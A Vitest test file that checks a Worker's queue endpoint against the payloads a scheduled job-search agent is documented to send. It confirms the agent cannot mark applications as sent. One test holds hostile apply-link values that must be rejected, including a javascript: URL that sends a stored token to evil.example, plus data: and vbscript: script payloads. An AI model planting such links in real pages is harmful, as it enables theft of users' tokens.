// The contract between the scheduled agent and the Worker.
//
// The agent's payload shape lived only in a prose document, so nothing proved
// the Worker would accept what docs/agent-loop.md tells it to send — or reject
// what that document forbids. These drive the worked examples from that file
// through the real fetch handler.

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import worker, { type Env } from '../src/index'
import { listOptionsFromSearch } from '../src/router'

const env: Env = {
  SUPABASE_URL: 'https://ref.supabase.co',
  SUPABASE_SERVICE_ROLE_KEY: 'service-key',
  API_TOKEN: 'test-token',
  APP_TIMEZONE: 'Asia/Dubai',
}

/** The first worked example in docs/agent-loop.md, verbatim. */
const CANDIDATE = {
  company: 'Emirates Group',
  role: 'Asset Data Lead',
  location: 'Dubai, UAE',
  job_url: 'https://ae.indeed.com/viewjob?jk=abc123',
  source: 'indeed',
  match_score: 9.5,
  match_rationale:
    '4 domain — owns the CMMS data model and the condition-based maintenance ' +
    'regime; 2 seniority — Head-level, owns vendor budget; 2 UAE onsite; ' +
    '0.5 comp not stated; 1 employer-posted with full scope',
}

function stub(response: unknown[] = [{ id: 'row' }], status = 201) {
  const spy = vi.fn(async (_url: string, _init?: RequestInit) =>
    new Response(JSON.stringify(response), { status }),
  )
  vi.stubGlobal('fetch', spy)
  return spy
}

const queue = (body: unknown) =>
  worker.fetch(
    new Request('https://w/api/queue', {
      method: 'POST',
      headers: { authorization: 'Bearer test-token', 'content-type': 'application/json' },
      body: JSON.stringify(body),
    }),
    env,
  )

const sent = (spy: ReturnType<typeof stub>) =>
  JSON.parse(spy.mock.calls[0]![1]!.body as string)

beforeEach(() => stub())
afterEach(() => vi.unstubAllGlobals())

describe('the payload the agent is told to send is the payload the Worker takes', () => {
  it('accepts the documented candidate and returns 201', async () => {
    const spy = stub()
    const res = await queue(CANDIDATE)
    expect(res.status).toBe(201)
    // Every documented field survives to the database.
    expect(sent(spy)).toMatchObject({
      company: 'Emirates Group',
      role: 'Asset Data Lead',
      location: 'Dubai, UAE',
      job_url: 'https://ae.indeed.com/viewjob?jk=abc123',
      source: 'indeed',
      match_score: 9.5,
      match_rationale: expect.stringContaining('4 domain'),
    })
  })

  it('carries a half-point score through, since the rubric produces them', async () => {
    // match_score is numeric(4,1) in Postgres; 0.5 steps are the common case
    // because "compensation not stated" scores 0.5 and that is the UAE norm.
    for (const score of [9.5, 8.5, 7.5, 6.5, 0]) {
      const spy = stub()
      await queue({ ...CANDIDATE, match_score: score })
      expect(sent(spy).match_score).toBe(score)
    }
  })

  it('accepts the top and bottom of the scale', async () => {
    expect((await queue({ ...CANDIDATE, match_score: 10 })).status).toBe(201)
    expect((await queue({ ...CANDIDATE, match_score: 0 })).status).toBe(201)
    expect((await queue({ ...CANDIDATE, match_score: 10.5 })).status).toBe(400)
    expect((await queue({ ...CANDIDATE, match_score: -0.5 })).status).toBe(400)
  })
})

describe('the agent cannot claim an application, whatever it sends', () => {
  it('strips status and applied_on even when supplied', async () => {
    const spy = stub()
    const res = await queue({ ...CANDIDATE, status: 'applied', applied_on: '2026-01-01' })
    expect(res.status).toBe(201)
    const body = sent(spy)
    expect(body.status).toBe('saved')
    expect(body).not.toHaveProperty('applied_on')
  })

  it('has no route that would let it record a send', async () => {
    // /apply exists, but it is the dashboard's button. The agent's own endpoint
    // is /api/queue and it cannot reach applied status through it.
    const spy = stub()
    await queue({ ...CANDIDATE, status: 'interview' })
    expect(sent(spy).status).toBe('saved')
  })
})

describe('what the agent must not be able to store', () => {
  it('rejects a posting whose apply link would execute as script', async () => {
    // job_url comes from a third-party posting and ends up in an href the
    // human is told to click.
    for (const hostile of [
      'javascript:fetch("https://evil.example/?t="+localStorage.jt_token)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
    ]) {
      const res = await queue({ ...CANDIDATE, job_url: hostile })
      expect(res.status).toBe(400)
      expect((await res.json() as any).error).toMatch(/job_url/)
    }
  })

  it('refuses a candidate with no link, score or reasoning', async () => {
    // A scored candidate with no rationale is not reviewable, and one with no
    // URL cannot be deduped or applied to.
    const required = ['job_url', 'match_score', 'match_rationale', 'company', 'role']
    for (const field of required) {
      const body: Record<string, unknown> = { ...CANDIDATE }
      delete body[field]
      const res = await queue(body)
      expect(res.status, `${field} should be required`).toBe(400)
      expect((await res.json() as any).error).toMatch(new RegExp(field))
    }
  })

  it('maps a re-queued role to 409 rather than a duplicate row', async () => {
    // The job_url unique index is what makes a re-run idempotent. Six runs a
    // day means this fires constantly and must not read as an error.
    vi.stubGlobal(
      'fetch',
      vi.fn(async () => new Response(JSON.stringify({ code: '23505' }), { status: 400 })),
    )
    const res = await queue(CANDIDATE)
    expect(res.status).toBe(409)
  })
})

describe('the queue the human then reads', () => {
  it('orders by fit, best first, and shows only unsent roles', async () => {
    const options = listOptionsFromSearch(new URLSearchParams('queue=true'), 'applications')
    expect(options.order).toBe('match_score.desc.nullslast,created_at.desc')
    expect(options.filters.status).toBe('eq.saved')
  })

  it('caps a run at what a human will actually read', async () => {
    // docs/agent-loop.md caps the agent at 10 per run; the list endpoint
    // defaults to 50, so a day of runs stays visible on one page.
    expect(listOptionsFromSearch(new URLSearchParams()).limit).toBe(50)
    expect(listOptionsFromSearch(new URLSearchParams('limit=10')).limit).toBe(10)
  })
})
